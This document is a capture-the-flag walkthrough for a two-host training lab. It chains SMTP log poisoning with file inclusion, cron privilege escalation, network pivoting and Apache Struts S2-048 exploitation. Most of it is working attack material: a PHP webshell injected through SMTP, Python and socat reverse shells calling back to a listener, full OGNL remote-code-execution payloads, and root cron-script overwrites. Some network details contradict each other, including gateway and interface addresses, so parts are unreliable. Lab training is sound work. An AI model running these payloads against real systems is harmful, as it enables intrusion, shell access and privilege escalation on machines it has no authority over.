# AM-03: Network Junction 7 — Player Walkthrough

> **Difficulty:** Medium
> **Services:** SMTP (port 25), HTTP (port 80), routing status (port 9001) + internal-only (port 8080, 34483)
> **Flags:** 4 flags — User, Root, Internal User, Internal Root
> **Skills learned:** Service enumeration, hidden endpoint discovery, SMTP log poisoning, LFI (Local File Inclusion), cron-based privilege escalation, network pivoting, known CVE exploitation (Struts S2-048)

This is a **two-host** challenge. You'll compromise the public-facing host (junction7), then pivot to an isolated internal host that's not directly reachable. This walkthrough teaches you the full kill chain including network pivoting — a critical skill for real-world engagements.

---

## Prerequisites

- A Kali Linux VM with nmap, curl, nc, and ssh installed
- Understanding of basic web exploitation (SQLi, command injection from AM-01/02)

---

## Stage 1 — Reconnaissance

**Goal:** Discover all services on the public host.

```bash
nmap -p- -sV -sC localhost
```

**Expected output (dev ports):**
```
25/tcp open  smtp    Postfix smtpd
80/tcp open  http    Apache httpd (Junction 7 portal)
9001/tcp open  http    Python HTTP (routing daemon status)
```

**What we learned:** Three services. The SMTP and HTTP ports are common, but port 9001 is unusual — a Python HTTP service called "routing daemon status." Let's investigate that first.

**Quick look at the web portal:** If you browse to `http://localhost/` (dev) or the target IP on port 80 (production), you'll see the "QUORUM CONSTRUCT — NETWORK JUNCTION 7" portal page. It shows routing table status and mentions that routing daemon status is available on port 9001. The portal itself doesn't have any interactive features or login forms — it's a static information page. The real vulnerability is hidden, not linked from the main page.

---

## Stage 2 — Hidden Endpoint Discovery via Port 9001

**Goal:** Find hidden paths that aren't linked from the main web page.

```bash
curl http://localhost:9001/
```

**Expected output:**
```
Routing Table:
  10.10.2.0/24 — ANOMALOUS — Unregistered subnet

Monitored Services:
  Bolometer -> /junction-bolo/
```

**What we learned:**
1. There's an **unregistered subnet** (`10.10.2.0/24`) — this hints at an internal network we can't directly reach yet
2. There's a hidden path `/junction-bolo/` that isn't linked from the main web page on port 80

**Why this matters:** Services on non-standard ports often contain useful recon information. Always check every service nmap discovers — not just the obvious web and SSH.

---

## Stage 3 — SMTP Log Poisoning + LFI

**Goal:** Get remote code execution on junction7 by combining two vulnerabilities.

This stage uses a two-part attack: first we inject malicious PHP code into the Postfix mail log via SMTP, then we use a Local File Inclusion (LFI) vulnerability to execute that code.

### Part A — What is LFI?

**Local File Inclusion** is a web vulnerability where an application includes files from the server's filesystem based on user input. If the input isn't sanitized, an attacker can include arbitrary files — including log files that contain injected code.

Visit the hidden path we discovered:

```bash
curl http://localhost/junction-bolo/bolo.php
```

The page returns empty — `bolo.php` is waiting for a parameter.

The `bolo.php` script includes a log file based on a `bolo` parameter:

```bash
curl "http://localhost/junction-bolo/bolo.php?bolo=test"
```

**Expected output:**
```
PHP Warning:  include(test.log): failed to open stream: No such file or directory in /var/www/html/junction-bolo/bolo.php on line 17
PHP Warning:  include(): Failed opening 'test.log' for inclusion (include_path='.:/usr/share/php') in /var/www/html/junction-bolo/bolo.php on line 17
```

**What this tells us:** The script tries to include `test.log` (it appends `.log` to whatever you pass in the `bolo` parameter). The file doesn't exist, so PHP shows a warning. But the key insight is: **if we point it at a real file, the contents get included and executed as PHP.**

Let's verify with a real file — the Postfix mail log:

```bash
curl "http://localhost/junction-bolo/bolo.php?bolo=/var/log/mail"
```

This includes `/var/log/mail.log` — you'll see the Postfix mail log contents displayed in the response. Now, what if we could put PHP code into that log file?

### Part B — What is SMTP Log Poisoning?

Postfix (the SMTP server) logs all SMTP commands to `/var/log/mail`. If we include PHP code in an SMTP command, it gets written to the mail log verbatim. Then we use the LFI to include `/var/log/mail` — and the PHP code executes!

### Part C — The Attack

**Step 1:** Inject PHP code into the mail log via SMTP.

We'll use the `VRFY` command — Postfix logs the illegal address syntax from VRFY attempts verbatim, making it a reliable injection vector:

```bash
printf 'HELO x\r\nVRFY <?php echo shell_exec($_GET["cmd"]); ?>\r\nQUIT\r\n' | nc localhost 25
```

**What's happening:**
- `VRFY` is an SMTP command that verifies an email address. Postfix doesn't support it by default and logs the rejected address verbatim to `/var/log/mail`.
- The PHP code (`<?php echo shell_exec($_GET['cmd']); ?>`) is now in the mail log.
- This code is a **webshell** — it executes whatever command is passed via the `cmd` parameter.

**Note:** You may see `501 5.1.3 Bad recipient address syntax` in the SMTP response — this is expected. The point isn't that the SMTP command succeeds; it's that Postfix logs the PHP code to the mail log file.

**Alternative approach using MAIL FROM:** You can also inject via `MAIL FROM`, though Postfix rejects the syntax with a `555` error — the PHP code still lands in the log:

```bash
printf 'HELO x\r\nMAIL FROM: <test@construct.local> <?php echo shell_exec($_GET["cmd"]); ?>\r\nQUIT\r\n' | nc localhost 25
```

Either method works — the PHP code ends up in `/var/log/mail.log` regardless of whether the SMTP command itself succeeds.

**Step 2:** Trigger the LFI to include the poisoned mail log:

```bash
curl "http://localhost/junction-bolo/bolo.php?bolo=/var/log/mail&cmd=id"
```

**Expected output:** The response will contain mail log lines mixed with the command output. Look for the `uid=` line:

```
Aug 01 ... junction7 postfix/smtpd[...]: warning: Illegal address syntax ... uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**It worked!** The `uid=33(www-data)` output appears in the response — the LFI included `/var/log/mail`, the PHP code inside executed, and `id` ran as `www-data`. We now have RCE (Remote Code Execution). The output is mixed with mail log entries because the entire log file is included — the PHP code runs when PHP encounters it in the log.

### Part D — Get a Reverse Shell

The webshell is powerful but one command at a time. Let's get a proper shell.

The container does **not** have `nc`/`netcat` installed, so the classic
`mkfifo` reverse shell won't work. It does have `python3` and `socat`.

**First, find the right IP.** The container runs on a Docker bridge network.
From the host, find the gateway the container uses:

```bash
docker inspect dz-am03-junction7 --format '{{range $k,$v := .NetworkSettings.Networks}}{{println $v.IPAddress $v.Gateway}}{{end}}'
# 10.10.2.3              (internal network — no gateway)
# 10.10.3.2 10.10.3.1    (public network — gateway 10.10.3.1 is your host)
```

Use the **public network gateway** (here `10.10.3.2`) as the attacker IP —
that's your host's IP on the container's network.

**On your attacking machine (the host), start a listener:**
```bash
nc -lvnp 4444
```

**Via the webshell (use `python3`, which is installed in the container):**
```bash
curl -G --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.3.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'" "http://localhost/junction-bolo/bolo.php?bolo=/var/log/mail"
```

**Alternatively, using `socat` (also installed):**
```bash
curl -G \
  --data-urlencode "cmd=socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:172.20.0.1:4444" \
  "http://localhost/junction-bolo/bolo.php?bolo=/var/log/mail"
```

> **Note on `--data-urlencode`:** The reverse shell payload contains spaces,
> quotes, and parentheses. Using `-G --data-urlencode` lets curl handle
> URL-encoding; inlining it in the query string by hand is error-prone. If you
> do inline it, you must encode `&` as `%26`, spaces as `+` or `%20`, etc.

You now have an interactive shell as `www-data` on junction7.

---

## Stage 4 — Cron-Based Privilege Escalation (User Flag)

**Goal:** Escalate from `www-data` to root on junction7 using a world-writable cron script.

**What is cron?** Cron is Linux's task scheduler. It runs commands at specified intervals. If a cron job runs a script that's writable by a low-privilege user, you can modify the script to execute your own commands as root.

Look for writable scripts:

```bash
ls -la /opt/junction/routing_updater.sh
# -rwxrwxrwx 1 root root ... /opt/junction/routing_updater.sh
```

Check when it runs:
```bash
cat /etc/cron.d/routing-updater
# * * * * * root /opt/junction/routing_updater.sh
```

**The vulnerability:** The script is world-writable (`rwxrwxrwx`) and runs as root every minute. 

Let's check the contents of /opt/junction/routing_updater.sh:
```bash
cat /opt/junction/routing_updater.sh
# * * * * * root /opt/junction/routing_updater.sh
#!/bin/bash
# QUORUM routing table auto-updater
# Directors may modify routing criteria as infrastructure evolves.
# This script is intentionally world-writable to allow rapid updates.
#
# Runs every minute via /etc/cron.d/routing-updater (root).

echo "[routing_updater] scanning routing tables at $(date)..." >> /var/log/routing_updater.log
ip route show >> /var/log/routing_updater.log 2>/dev/null || true
```
We see that it writes data to a log file.  We will now overwrite the file to dump the user flag into this log file:

```bash
echo '#!/bin/bash
cat /root/user.txt >> /var/log/routing_updater.log' > /opt/junction/routing_updater.sh
```

Wait up to 60 seconds for cron to execute it, then check:

```bash
cat /var/log/routing_updater.log
<tml/junction-bolo$ cat /var/log/routing_updater.log
[routing_updater] scanning routing tables at Sat Aug  8 18:46:01 UTC 2026...
DZ{user_junction7_PLACEHOLDER}
```

---

## Stage 5 — Discovering the Internal Network

**Goal:** Find the hidden internal host that we can't reach directly.

On junction7, check the network interfaces:

```bash
ip addr
```
If ip isn't installed, use ifconfig:
```bash
ifconfig

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.2.3  netmask 255.255.255.0  broadcast 10.10.2.255
        ether 2e:76:5a:cd:df:92  txqueuelen 0  (Ethernet)
        RX packets 20  bytes 1560 (1.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3  bytes 126 (126.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.3.2  netmask 255.255.255.0  broadcast 10.10.3.255
        ether 36:d3:a9:ee:ff:a5  txqueuelen 0  (Ethernet)
        RX packets 63  bytes 5869 (5.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 41  bytes 8365 (8.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```


**Expected output:**
```
eth0: 10.10.3.x (public network)
eth1: 10.10.2.x (internal network — the "anomalous" subnet)
```

**What we learned:** junction7 has two network interfaces. The second one (`eth1`) is on the `10.10.2.0/24` subnet — the unregistered subnet we saw on port 9001. This is our pivot point.

Ping-sweep the internal subnet to find hosts:

```bash
for i in $(seq 1 254); do (ping -c1 -W1 10.10.2.$i 2>/dev/null && echo "10.10.2.$i UP"); done
```

Port-scan the discovered host (the container has no `nc` or `nmap` — use
bash's built-in `/dev/tcp`):

```bash
for p in 8080 34483; do timeout 1 bash -c "echo >/dev/tcp/10.10.2.<internal_ip>/$p" 2>/dev/null && echo "port $p OPEN" || echo "port $p closed"; done
# port 8080 OPEN
# port 34483 OPEN
```

---

## Stage 6 — Struts S2-048 Exploitation (Internal User Flag)

**Goal:** Exploit a known CVE (Apache Struts S2-048) on the internal host to get RCE.

**What is Struts S2-048?** It's a known vulnerability (CVE-2017-9791) in the Apache Struts framework. The Struts Showcase application's `saveGangster` action passes user input (the `name` parameter) into an `ActionMessage`, which is rendered by the `<s:actionmessage>` JSP tag. That tag evaluates OGNL expressions embedded in the message — so OGNL in the `name` parameter gets executed.

Verify the Struts showcase is deployed:

```bash
curl http://10.10.2.<ip>:8080/struts2_2.3.15.1-showcase/
```

Test OGNL injection — if `%{1+1}` evaluates to `2`, the vulnerability is confirmed:

```bash
curl -s -X POST "http://10.10.2.<ip>:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action" \
  --data-urlencode 'name=test%{1+1}' \
  --data 'age=22' \
  --data '__multilineMessage=test'
# Look for: "Gangster test2 added successfully" (the %{1+1} evaluated to 2)
```

Exploit the `saveGangster` endpoint for RCE. The OGNL expression uses `ProcessBuilder` to run a command and `BufferedReader` to capture the output. **The `name` parameter must be sent via POST** (GET is rejected by form validation):

```bash
curl -s -X POST "http://10.10.2.<ip>:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action" \
  --data-urlencode 'name=test%{#p=new java.lang.ProcessBuilder({"/bin/bash","-c","id"}),#p.redirectErrorStream(true),#out=#p.start(),#out.waitFor(),#br=new java.io.BufferedReader(new java.io.InputStreamReader(#out.getInputStream())),#line=#br.readLine(),#sb=new java.lang.StringBuilder(),#sb.append(#line),#sb.toString()}' \
  --data 'age=22' \
  --data '__multilineMessage=test'
# Look for: "Gangster testuid=0(root) gid=0(root) groups=0(root) added successfully"
```

> **How the OGNL payload works:**
> - `%{...}` — OGNL expression delimiter, evaluated by `<s:actionmessage>`
> - `ProcessBuilder({"/bin/bash","-c","id"})` — runs the command (OGNL `{}` creates a List, which ProcessBuilder accepts)
> - `#out.waitFor()` — waits for the command to finish
> - `BufferedReader` + `readLine()` — captures the first line of output
> - The result is appended to the "Gangster test" message — look for it in the `<li><span>` tag

Read the internal user flag. The flag format `DZ{...}` contains curly braces which break Struts' `MessageFormat` rendering, so **base64-encode** the output to avoid a 500 error:

```bash
curl -s -X POST "http://10.10.2.<ip>:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action" \
  --data-urlencode 'name=test%{#p=new java.lang.ProcessBuilder({"/bin/bash","-c","cat /home/compliance/user.txt | base64"}),#p.redirectErrorStream(true),#out=#p.start(),#out.waitFor(),#br=new java.io.BufferedReader(new java.io.InputStreamReader(#out.getInputStream())),#line=#br.readLine(),#sb=new java.lang.StringBuilder(),#sb.append(#line),#sb.toString()}' \
  --data 'age=22' \
  --data '__multilineMessage=test'
# Look for: "Gangster testRFp7aW50ZXJuYWxf..." (base64-encoded flag)

# Decode it:
echo "RFp7aW50ZXJuYWxf..." | base64 -d
# DZ{internal_user_junction7_PLACEHOLDER}
```

---

## Stage 7 — Cron-Based Privilege Escalation on Internal Host (Root Flag)

Same pattern as Stage 4 — the internal host has a world-writable cron script at `/opt/junction/system_check.sh` that runs every minute as root. Overwrite it via the Struts RCE:

```bash
# Overwrite the world-writable cron script via Struts RCE:
curl -s -X POST "http://10.10.2.<ip>:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action" \
  --data-urlencode 'name=test%{#p=new java.lang.ProcessBuilder({"/bin/bash","-c","echo \"#!/bin/bash\ncat /root/root.txt > /tmp/cron_root_flag.txt\" > /opt/junction/system_check.sh"}),#p.redirectErrorStream(true),#out=#p.start(),#out.waitFor()}' \
  --data 'age=22' \
  --data '__multilineMessage=test'

# Wait up to 60 seconds for the cron job to fire, then read the flag:
curl -s -X POST "http://10.10.2.<ip>:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action" \
  --data-urlencode 'name=test%{#p=new java.lang.ProcessBuilder({"/bin/bash","-c","cat /tmp/cron_root_flag.txt | base64"}),#p.redirectErrorStream(true),#out=#p.start(),#out.waitFor(),#br=new java.io.BufferedReader(new java.io.InputStreamReader(#out.getInputStream())),#line=#br.readLine(),#sb=new java.lang.StringBuilder(),#sb.append(#line),#sb.toString()}' \
  --data 'age=22' \
  --data '__multilineMessage=test'
# Decode the base64 output:
# DZ{internal_root_junction7_PLACEHOLDER}
```

---

## Summary

| Step | Technique | What we did |
|------|-----------|-------------|
| 1 | Nmap enumeration | Found SMTP (25), HTTP (80), routing (9001) |
| 2 | Hidden endpoint discovery | Port 9001 revealed `/junction-bolo/` path |
| 3 | SMTP log poisoning + LFI | Injected PHP into mail log, executed via LFI |
| 4 | Cron privesc | Overwrote world-writable cron script, got user flag |
| 5 | Network discovery | Found internal subnet via `ip addr`, ping-swept |
| 6 | CVE exploitation (S2-048) | Exploited Struts RCE on internal host |
| 7 | Cron privesc (internal) | Same technique on internal host, got root flag |

**Key takeaways:**
- **Check every service, even unusual ones.** Port 9001 gave us the critical clue.
- **LFI + log poisoning is a powerful combo.** Inject code into a log, include it via LFI, get RCE.
- **Pivoting is essential.** The internal host isn't directly reachable — you must go through the compromised host.
- **Known CVEs are fair game.** Learn to search for and exploit published vulnerabilities.
- **Cron jobs are a common privesc vector.** Always check `/etc/cron.d/` and look for writable scripts.
